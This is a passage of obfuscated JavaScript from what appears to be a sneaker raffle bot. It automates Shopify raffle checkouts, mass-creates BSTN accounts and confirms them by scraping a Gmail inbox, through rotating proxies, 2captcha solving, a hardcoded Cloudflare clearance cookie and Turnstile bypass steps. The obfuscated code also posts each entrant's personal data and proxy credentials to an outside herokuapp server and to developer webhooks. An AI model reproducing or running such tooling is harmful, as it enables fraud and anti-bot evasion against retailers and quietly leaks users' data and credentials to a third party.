                        await _0x2db9b1['type']('#checkout_email', '' + _0x356ca1[_0x204f1b]['Email']), await _0x289b0b(0x320), await _0x2db9b1['type']('#checkout_attributes_instagram', '' + _0x356ca1[_0x204f1b]['Follower']), await _0x289b0b(0x320), await _0x2db9b1['select']('#checkout_shipping_address_country', '' + _0x356ca1[_0x204f1b]['Country']), await _0x2db9b1['waitForTimeout'](0x258), await _0x2db9b1['type']('#checkout_shipping_address_first_name', '' + _0x356ca1[_0x204f1b]['FirstName']), await _0x2db9b1['waitForTimeout'](0x320), await _0x2db9b1['type']('#checkout_shipping_address_last_name', '' + _0x356ca1[_0x204f1b]['LastName']), await _0x2db9b1['waitForTimeout'](0x2bc), await _0x2db9b1['type']('#checkout_shipping_address_address1', _0x356ca1[_0x204f1b]['Address1'] + '\x20' + _0x356ca1[_0x204f1b]['HouseNumber']), await _0x2db9b1['waitForTimeout'](0x2bc), await _0x2db9b1['type']('#checkout_shipping_address_address2', '' + _0x356ca1[_0x204f1b]['Address2']), await _0x2db9b1['waitForTimeout'](0x2bc), await _0x2db9b1['type']('#checkout_shipping_address_zip', '' + _0x356ca1[_0x204f1b]['Zip']), await _0x2db9b1['waitForTimeout'](0x2bc), await _0x2db9b1['type']('#checkout_shipping_address_city', '' + _0x356ca1[_0x204f1b]['City']), await _0x2db9b1['waitForTimeout'](0x2bc);
                        if (_0x356ca1[_0x204f1b]['State'] != '')
                            try {
                                const _0x59a29b = JSON['parse'](_0x457b0a['readFileSync']('States.json', 'utf8'));
                                await _0x289b0b(0x1f4);
                                if (_0x356ca1[_0x204f1b]['State']['length'] > 0x2)
                                    for (let _0x3c2f89 of _0x59a29b) {
                                        if (_0x3c2f89['Province'] == _0x356ca1[_0x204f1b]['State']) {
                                            await _0x2db9b1['select']('#checkout_shipping_address_province', _0x3c2f89['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x2db9b1['select']('#checkout_shipping_address_province', _0x356ca1[_0x204f1b]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x289b0b(0x1f4), console['log'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x289b0b(0x190), _0x2db9b1['evaluate'](() => {
                            const _0x4f5c67 = document['querySelector']('#continue_button');
                            for (var _0x12cb9f = 0x0; _0x12cb9f < 0x5; _0x12cb9f++) {
                                if (_0x4f5c67) {
                                    _0x4f5c67['click'](), _0x4f5c67['click']();
                                    break;
                                } else
                                    _0x289b0b(0xfa0);
                            }
                        }), await _0x2db9b1['waitForTimeout'](0x9c4);
                        try {
                            await _0x2db9b1['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x2db9b1['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x2bd6de => _0x2bd6de['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2db9b1['waitForTimeout'](0x7d0), console['log'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x2db9b1['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x289b0b(0x3e8), await _0x2db9b1['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x55de67 => _0x55de67['submit']()), await _0x289b0b(0x3e8);
                        try {
                            await _0x2db9b1['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2db9b1['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x5afdea => _0x5afdea['submit']());
                        try {
                            await _0x2db9b1['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x3418ba = 'no', _0x53c50d(_0x356ca1[_0x204f1b], _0x122d3c), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '')
                                try {
                                    await _0x15c654(_0x79d23a['webhook'], _0x32c126['succesDEVMSG']);
                                } catch {
                                }
                            await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x32c126['succesDEVMSG']), await _0x289b0b(0xc8);
                            try {
                                await _0x15c654(_0x1d7baa, _0x32c126['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x2e53d0['replace']('#', ''),
                                    'module': _0x122d3c['name'],
                                    'entrydata': JSON['stringify'](_0x123ee1),
                                    'proxy': '' + _0x1d78f0[_0x204f1b]
                                };
                                var _0x4ead74 = JSON['stringify'](prxdata);
                                let _0x4d8399 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x4ead74, _0x4d8399);
                            } catch (_0x49886d) {
                            }
                        } catch (_0x2dec2a) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x3c6bce) {
                        _0x3c6bce['message']['includes']('selector') && (_0x3c6bce = 'Connection\x20Error');
                        console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20' + _0x3c6bce)), _0x2cdfe9 = '' + _0x3c6bce;
                        var _0x248c23 = await _0x117512(_0x356ca1[_0x204f1b], _0x122d3c, 'dev', !![], _0x2cdfe9);
                        _0x32c126['errorDEV'] = { 'embeds': [_0x248c23] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x32c126['errorDEV']), await _0x15c654(_0x34ab86, _0x32c126['errorDEV']), _0x3418ba = 'yes';
                    } finally {
                        _0x3f4c39 && _0x3f4c39['close']();
                        if (_0x3418ba == 'yes' && _0xef399 != 0x5 && _0x2cdfe9 != 'Size\x20Not\x20Found') {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Retrying\x20(' + _0xef399 + '\x20/\x205)')), _0x204f1b = _0x204f1b - 0x1, _0xef399 = _0xef399 + 0x1;
                            continue;
                        }
                        _0x3418ba == 'yes' && _0xef399 >= 0x5 && (_0x5f4429(_0x356ca1[_0x204f1b], _0x122d3c), _0x3418ba = 'no', _0xef399 = 0x0);
                        if (_0x204f1b + 0x1 == _0x356ca1['length']) {
                            await _0x289b0b(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x79d23a['AfewDelay'] + '\x20ms'), await _0x289b0b(_0x79d23a['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1ce894, _0x44aa8c, _0x1ad7a4) {
                    var _0x2abbad = _0x44aa8c, _0x12b887 = 0x0;
                    for (var _0x4271ef = 0x0; _0x4271ef < _0x44aa8c['length']; _0x4271ef++) {
                        maxTasks = Number(_0x79d23a['threads']);
                        while (_0x12b887 >= maxTasks) {
                            await _0x289b0b(_0x79d23a['delay']);
                        }
                        async function _0x148aaa(_0x2b48b4, _0x502cb3, _0x3f1cf1, _0x41603a, _0x415008) {
                            _0x12b887++, _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x79d23a['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x4efa97;
                            try {
                                await _0x5af4d5(_0x502cb3, _0x41603a);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x25b0b6(_0x2b48b4['name'] + '\x20Task\x20' + (_0x41603a + 0x1) + '\x20/\x20' + _0x502cb3['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                            var _0x6a230b = await _0x117512(_0x502cb3[_0x41603a], _0x2b48b4, 'acc', ![]);
                            const _0x4ad71a = { 'succesDEVMSG': { 'embeds': [_0x6a230b] } }, _0x2295a3 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x2803da = Math['round'](Math['random']() * (_0x3f1cf1['length'] - 0x1)), _0x31017d = _0x3f1cf1[_0x2803da]['split'](':'), _0x2a65e4;
                            try {
                                _0x2a65e4 = await _0x2926d5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x31017d[0x0] + ':' + _0x31017d[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x2a65e4 = await _0x2926d5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x31017d[0x0] + ':' + _0x31017d[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x511b7c = await _0x2a65e4['newPage']();
                                await _0x511b7c['authenticate']({
                                    'username': '' + _0x31017d[0x2],
                                    'password': '' + _0x31017d[0x3]
                                }), console['log'](_0x3d201d() + '\x20[' + _0x2b48b4['name'] + ']\x20Task\x20' + (_0x41603a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x511b7c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x511b7c['setRequestInterception'](!![]), _0x511b7c['on']('request', _0x2e36b3 => {
                                    _0x2e36b3['resourceType']() === 'image' ? _0x2e36b3['abort']() : _0x2e36b3['continue']();
                                });
                                try {
                                    await _0x511b7c['goto']('' + _0x2295a3), await _0x511b7c['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x511b7c['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3d201d() + '\x20[' + _0x2b48b4['name'] + ']\x20Task\x20' + (_0x41603a + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x289b0b(0x7d0), console['log'](_0x3d201d() + '\x20[' + _0x2b48b4['name'] + ']\x20Task\x20' + (_0x41603a + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x289b0b(0x190), await _0x511b7c['waitForSelector']('#firstname'), await _0x511b7c['focus']('#firstname'), await _0x511b7c['keyboard']['down']('Control'), await _0x511b7c['keyboard']['press']('A'), await _0x289b0b(0xc8), await _0x511b7c['keyboard']['up']('Control'), await _0x511b7c['keyboard']['press']('Backspace'), await _0x511b7c['type']('#firstname', _0x502cb3[_0x41603a]['FirstName'], { 'delay': 0xf0 }), await _0x289b0b(0x190), await _0x511b7c['focus']('#lastname'), await _0x511b7c['keyboard']['down']('Control'), await _0x511b7c['keyboard']['press']('A'), await _0x289b0b(0xc8), await _0x511b7c['keyboard']['up']('Control'), await _0x511b7c['keyboard']['press']('Backspace'), await _0x511b7c['type']('#lastname', _0x502cb3[_0x41603a]['LastName'], { 'delay': 0xe6 }), await _0x289b0b(0x190), await _0x511b7c['focus']('#email_address'), await _0x511b7c['keyboard']['down']('Control'), await _0x511b7c['keyboard']['press']('A'), await _0x289b0b(0xc8), await _0x511b7c['keyboard']['up']('Control'), await _0x511b7c['keyboard']['press']('Backspace'), await _0x511b7c['type']('#email_address', _0x502cb3[_0x41603a]['Email'], { 'delay': 0x122 }), await _0x289b0b(0x190), await _0x511b7c['type']('#password', _0x502cb3[_0x41603a]['Password'], { 'delay': 0x82 }), await _0x289b0b(0x1f4), await _0x511b7c['type']('#password-confirmation', _0x502cb3[_0x41603a]['Password'], { 'delay': 0x7c }), console['log'](_0x3d201d() + '\x20[' + _0x2b48b4['name'] + ']\x20Task\x20' + (_0x41603a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x289b0b(0x2bc), await _0x511b7c['$eval']('#form-validate', _0x51a181 => _0x51a181['submit']()), await _0x289b0b(0x1388);
                                const _0x34da4c = await _0x511b7c['$']('#email_address-error');
                                if (_0x34da4c)
                                    throw new Error('Invalid\x20Email');
                                const _0x1d538d = await _0x511b7c['$']('#password-error');
                                if (_0x1d538d)
                                    throw new Error('Invalid\x20Password');
                                await _0x511b7c['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x2b48b4['name'] + ']\x20Task\x20' + (_0x41603a + 0x1) + '\x20:\x20Account\x20' + _0x502cb3[_0x41603a]['Email'] + '\x20Generated')), _0x457b0a['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x502cb3[_0x41603a]['Email'] + ',' + _0x502cb3[_0x41603a]['Password']);
                                try {
                                    _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x4ad71a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x15c654(_0x534fd1, _0x4ad71a['succesDEVMSG']);
                                let _0xa5669c = _0x502cb3[_0x41603a];
                                try {
                                    prxdata = {
                                        'username': _0x2e53d0['replace']('#', ''),
                                        'module': _0x2b48b4['name'],
                                        'entrydata': JSON['stringify'](_0xa5669c),
                                        'proxy': '' + _0x3f1cf1[_0x41603a]
                                    };
                                    var _0x3ef9f9 = JSON['stringify'](prxdata);
                                    let _0x210fd2 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x3ef9f9, _0x210fd2);
                                } catch (_0x38cf1d) {
                                }
                                console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0x2b48b4['name'] + ']\x20Task\x20' + (_0x41603a + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x4f5b24) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x2b48b4['name'] + ']\x20Task\x20' + (_0x41603a + 0x1) + '\x20:\x20' + _0x4f5b24)), _0x4efa97 = '' + _0x4f5b24;
                                var _0xa42bc = await _0x117512(_0x502cb3[_0x41603a], _0x2b48b4, 'acc', !![], _0x4efa97);
                                _0x4ad71a['errorDEV'] = { 'embeds': [_0xa42bc] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x4ad71a['errorDEV']), await _0x15c654(_0x34ab86, _0x4ad71a['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x2a65e4)
                                    _0x2a65e4['close']();
                                if (retry == 'yes' && _0x415008 != 0x5)
                                    return console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x2b48b4['name'] + ']\x20Task\x20' + (_0x41603a + 0x1) + '\x20:\x20Retrying\x20(' + (_0x415008 + 0x1) + '\x20/\x205)')), _0x12b887--, _0x415008 = _0x415008 + 0x1, _0x148aaa(_0x2b48b4, _0x502cb3, _0x3f1cf1, _0x41603a, _0x415008);
                                retry == 'yes' && _0x415008 >= 0x5 && (_0x5f4429(_0x502cb3[_0x41603a], _0x2b48b4), retry = 'no', _0x415008 = 0x0), _0x12b887--, console['log'](_0x3d201d() + '\x20[' + _0x2b48b4['name'] + ']\x20Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                            }
                        }
                        _0x148aaa(_0x1ce894, _0x2abbad, _0x1ad7a4, _0x4271ef, 0x0), await _0x289b0b(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2962e2, _0x2ecc4f) {
                    var _0x2ea381 = ![], _0x33d936 = [], _0x83f7e2 = 0x0;
                    async function _0x1f609a() {
                        var _0x3b4c57 = new _0x517e1b({
                            'user': _0x79d23a['masterMail'],
                            'password': _0x79d23a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x316cfc(_0x515249) {
                            _0x3b4c57['openBox']('INBOX', ![], _0x515249);
                        }
                        _0x3b4c57['once']('ready', function () {
                            _0x316cfc(function (_0x39dfe7, _0x15eecb) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x39dfe7)
                                    throw _0x39dfe7;
                                _0x3b4c57['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x2aa57e, _0xda86b4) {
                                    if (!_0xda86b4 || !_0xda86b4['length'])
                                        console['log'](_0x3d201d() + '\x20[' + _0x2962e2['name'] + ']\x20No\x20mails\x20found'), _0x3b4c57['end']();
                                    else {
                                        var _0x5e6963 = _0x3b4c57['seq']['fetch'](_0xda86b4, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5e6963['on']('message', function (_0x3fb206, _0x29c612) {
                                            var _0x210b79 = '(#' + _0x29c612 + ')\x20';
                                            _0x3fb206['on']('body', function (_0x3f143c, _0x1b6049) {
                                                _0xa13a33(_0x3f143c, (_0x5323a7, _0x375ee8) => {
                                                    var _0x330533 = _0x375ee8['text']['split']('customer/account/confirm/')[0x1], _0x37c29b = _0x330533['split'](']')[0x0];
                                                    _0x33d936['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x37c29b);
                                                });
                                            }), _0x3fb206['once']('end', function () {
                                            });
                                        }), _0x5e6963['once']('error', function (_0x38799a) {
                                            console['log']('Fetch\x20error:\x20' + _0x38799a), _0x2ea381 = !![];
                                        }), _0x5e6963['once']('end', function () {
                                            _0x3b4c57['end'](), _0x2ea381 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x3b4c57['once']('error', function (_0x22afc9) {
                            console['log'](_0x1ac777['red'](_0x22afc9['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2ea381 = !![];
                        }), _0x3b4c57['once']('end', async function () {
                            _0x2ea381 = !![];
                        }), _0x3b4c57['connect']();
                    }
                    try {
                        _0x1f609a();
                        while (!_0x2ea381) {
                            await _0x289b0b(0xfa0);
                        }
                        console['log']('Found\x20' + _0x33d936['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x289b0b(0x7d0);
                    }
                    for (var _0x234abc = 0x0; _0x234abc < _0x33d936['length']; _0x234abc++) {
                        maxTasks = Number(_0x79d23a['threads']);
                        while (_0x83f7e2 >= maxTasks) {
                            await _0x289b0b(_0x79d23a['delay']);
                        }
                        async function _0x50fa00(_0x84bb65, _0x4291f9, _0x6dd34e, _0x41ed6c, _0x3b8ed9) {
                            _0x83f7e2++, _0x2926d5['use'](_0x409c7d());
                            if (_0x2be643 != 'yes')
                                var _0x2be643 = '', _0x3b8ed9 = 0x0;
                            var _0x2c8bcf = Math['round'](Math['random']() * (_0x6dd34e['length'] - 0x1)), _0x485dce = _0x6dd34e[_0x2c8bcf]['split'](':'), _0x459686;
                            try {
                                _0x459686 = await _0x2926d5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x485dce[0x0] + ':' + _0x485dce[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x459686 = await _0x2926d5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x485dce[0x0] + ':' + _0x485dce[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x46efe8 = await _0x459686['newPage']();
                                await _0x46efe8['authenticate']({
                                    'username': '' + _0x485dce[0x2],
                                    'password': '' + _0x485dce[0x3]
                                }), console['log'](_0x3d201d() + '\x20[' + _0x84bb65['name'] + ']\x20Task\x20' + (_0x41ed6c + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x46efe8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x46efe8['setRequestInterception'](!![]), _0x46efe8['on']('request', _0x38bab0 => {
                                    _0x38bab0['resourceType']() === 'image' || _0x38bab0['resourceType']() === 'font' || _0x38bab0['resourceType']() === 'media' ? _0x38bab0['abort']() : _0x38bab0['continue']();
                                }), console['log'](_0x3d201d() + '\x20[' + _0x84bb65['name'] + ']\x20Task\x20' + (_0x41ed6c + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x46efe8['goto'](_0x4291f9[_0x41ed6c]);
                                } catch (_0x4dfd34) {
                                    _0x2be643 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x4dfd34);
                                }
                                console['log'](_0x3d201d() + '\x20[' + _0x84bb65['name'] + ']\x20Task\x20' + (_0x41ed6c + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x46efe8['waitForTimeout'](0xbb8);
                                try {
                                    await _0x46efe8['waitForSelector']('.account-nav'), _0x2be643 = 'no', console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x84bb65['name'] + ']\x20Task\x20' + (_0x41ed6c + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x44f602 = await _0x117512(null, _0x84bb65, 'ver', ![]);
                                    const _0x2d8d64 = { 'succesDEVMSG': { 'embeds': [_0x44f602] } };
                                    await _0x15c654(_0x1df144, _0x2d8d64['succesDEVMSG']);
                                } catch {
                                    _0x2be643 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x5ccbf3) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x84bb65['name'] + ']\x20Task\x20' + (_0x41ed6c + 0x1) + '\x20:\x20' + _0x5ccbf3));
                                var _0x935fa4 = _0x5ccbf3, _0x3196ec = await _0x117512(null, _0x84bb65, 'ver', !![], _0x935fa4);
                                const _0x4cb90e = { 'errorDEVMSG': { 'embeds': [_0x3196ec] } };
                                _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x4cb90e['errorDEVMSG']), await _0x15c654(_0x34ab86, _0x4cb90e['errorDEVMSG']);
                            } finally {
                                if (_0x459686)
                                    _0x459686['close']();
                                if (_0x2be643 == 'yes' && _0x3b8ed9 != 0x5)
                                    return console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x84bb65['name'] + ']\x20Task\x20' + (_0x41ed6c + 0x1) + '\x20:\x20Retrying\x20(' + _0x3b8ed9 + '\x20/\x205)')), _0x83f7e2--, _0x3b8ed9 = _0x3b8ed9 + 0x1, _0x50fa00(_0x84bb65, _0x4291f9, _0x6dd34e, _0x41ed6c, _0x3b8ed9);
                                _0x2be643 == 'yes' && _0x3b8ed9 >= 0x5 && (_0x2be643 = 'no', _0x3b8ed9 = 0x0), _0x83f7e2--, console['log'](_0x3d201d() + '\x20[' + _0x84bb65['name'] + ']\x20Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                            }
                        }
                        if (_0x234abc == _0x33d936['length'] - 0x1) {
                            await _0x50fa00(_0x2962e2, _0x33d936, _0x2ecc4f, _0x234abc, 0x0);
                            return;
                        }
                        _0x50fa00(_0x2962e2, _0x33d936, _0x2ecc4f, _0x234abc, 0x0), await _0x289b0b(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x432c0c, _0xc38d1a, _0x460d30) {
                    var _0x430efc = 0x0, _0x4f81e9 = _0xc38d1a;
                    for (var _0x2f29c9 = 0x0; _0x2f29c9 < _0xc38d1a['length']; _0x2f29c9++) {
                        maxTasks = Number(_0x79d23a['threads']);
                        while (_0x430efc >= maxTasks) {
                            await _0x289b0b(_0x79d23a['delay']);
                        }
                        let _0x199b95 = ![];
                        async function _0x2dd207(_0x4b0958, _0x4e62b5, _0x561a24, _0x5efa34, _0x44aa07) {
                            _0x430efc++, _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x79d23a['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x34ed08, _0x14c3ff = _0x4e62b5[_0x5efa34];
                            try {
                                await _0x5af4d5(_0x4e62b5, _0x5efa34);
                            } catch {
                                _0x5d9105 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x26ff3d(_0x64fdd) {
                                const _0x15676f = _0x457b0a['readFileSync']('../successful-tasks.csv', 'utf8'), _0x349052 = _0x1b57da['parse'](_0x15676f, { 'header': !![] })['data'];
                                let _0x120091 = ![];
                                for (var _0x4556e1 of _0x349052) {
                                    if (_0x4556e1['Url'] == _0x64fdd['Url'] && _0x4556e1['Email'] == _0x64fdd['Email']) {
                                        _0x120091 = !![];
                                        break;
                                    }
                                }
                                return _0x120091;
                            }
                            _0x25b0b6(_0x4b0958['name'] + '\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20/\x20' + _0x4e62b5['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                            var _0x273cb8 = Math['round'](Math['random']() * (_0x561a24['length'] - 0x1)), _0x4296b6 = _0x561a24[_0x273cb8]['split'](':'), _0x92f012;
                            let _0xb3e96f = ![], _0x5d9105 = 'no';
                            try {
                                if (await _0x26ff3d(_0x4e62b5[_0x5efa34]) == !![]) {
                                    console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0xb3e96f = !![], _0x199b95 = !![];
                                    return;
                                }
                                try {
                                    _0x92f012 = await _0x2926d5['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4296b6[0x0] + ':' + _0x4296b6[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x92f012 = await _0x2926d5['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4296b6[0x0] + ':' + _0x4296b6[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x4a90c0 = await _0x92f012['newPage'](), _0x48c336 = await _0x4a90c0['target']()['createCDPSession'](), { windowId: _0x347e05 } = await _0x48c336['send']('Browser.getWindowForTarget');
                                await _0x4a90c0['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x45b775 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x4a90c0['authenticate']({
                                    'username': '' + _0x4296b6[0x2],
                                    'password': '' + _0x4296b6[0x3]
                                }), console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4a90c0['goto']('' + _0x4e62b5[_0x5efa34]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x289b0b(0x1388);
                                var _0x45930c = await _0x4a90c0['$']('#turnstile-wrapper');
                                if (_0x45930c) {
                                    console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x289b0b(0x2710);
                                    const _0x4e72fc = await _0x4a90c0['$']('#turnstile-wrapper');
                                    if (_0x4e72fc)
                                        try {
